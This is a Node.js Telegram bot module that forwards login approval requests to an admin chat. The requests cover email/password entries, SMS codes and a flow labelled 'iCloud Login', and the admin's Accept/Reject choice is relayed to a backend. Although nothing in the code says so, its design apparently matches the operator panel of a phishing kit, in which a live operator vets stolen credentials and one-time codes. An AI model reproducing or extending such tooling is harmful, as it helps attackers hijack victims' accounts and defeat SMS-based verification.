const TelegramBot = require("node-telegram-bot-api");
const fetch = require("node-fetch");

const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const APP_URL = process.env.APP_URL;

// Start bot in polling mode
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// -----------------
// Email/Password approval
// -----------------
function sendApprovalRequest(email, password) {
  const options = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Accept", callback_data: `accept|${email}` },
          { text: "❌ Reject", callback_data: `reject|${email}` }
        ]
      ]
    }
  };
  bot.sendMessage(ADMIN_CHAT_ID, `*Login Approval Requested*\n*Email:* ${email}`, { ...options, parse_mode: "Markdown" });
}

// -----------------
// Generic code approval
// -----------------
function sendApprovalRequestGeneric(identifier) {
  const options = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Accept", callback_data: `accept|${identifier}` },
          { text: "❌ Reject", callback_data: `reject|${identifier}` }
        ]
      ]
    }
  };
  bot.sendMessage(ADMIN_CHAT_ID, `*Approval Requested*\nIdentifier: ${identifier}`, { ...options, parse_mode: "Markdown" });
}

// -----------------
// SMS code approval
// -----------------
function sendApprovalRequestSMS(code) {
  const options = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Accept", callback_data: `accept|${code}` },
          { text: "❌ Reject", callback_data: `reject|${code}` }
        ]
      ]
    }
  };
  bot.sendMessage(ADMIN_CHAT_ID, `*SMS Approval Requested*\n*Code:* ${code}`, { ...options, parse_mode: "Markdown" });
}

// -----------------
// iCloud Login approval
// -----------------
function sendApprovalRequestPage(email, password) {
  const options = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Accept", callback_data: `accept|${email}` },
          { text: "❌ Reject", callback_data: `reject|${email}` }
        ]
      ]
    }
  };
  bot.sendMessage(ADMIN_CHAT_ID, `*iCloud Login Approval Requested*\n*Email:* ${email}`, { ...options, parse_mode: "Markdown" });
}

// -----------------
// Handle button clicks
// -----------------
bot.on("callback_query", async (query) => {
  try {
    const [action, identifier] = query.data.split("|");
    const status = action === "accept" ? "accepted✅" : "rejected";

    // Notify backend
    await fetch(`${APP_URL}/update-status`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ identifier, status })
    });

    await bot.answerCallbackQuery(query.id, { text: `✅ ${status}` });
    await bot.editMessageText(`🔐 ${identifier} has been *${status.toUpperCase()}*`, {
      chat_id: query.message.chat.id,
      message_id: query.message.message_id,
      parse_mode: "Markdown"
    });

  } catch (err) {
    console.error("❌ Failed to handle callback:", err);
    bot.sendMessage(ADMIN_CHAT_ID, `⚠️ Error handling approval`);
  }
});

// /start command
bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id, "✅ Bot is running and waiting for approvals.");
});

module.exports = { sendApprovalRequest, sendApprovalRequestGeneric, sendApprovalRequestSMS, sendApprovalRequestPage };



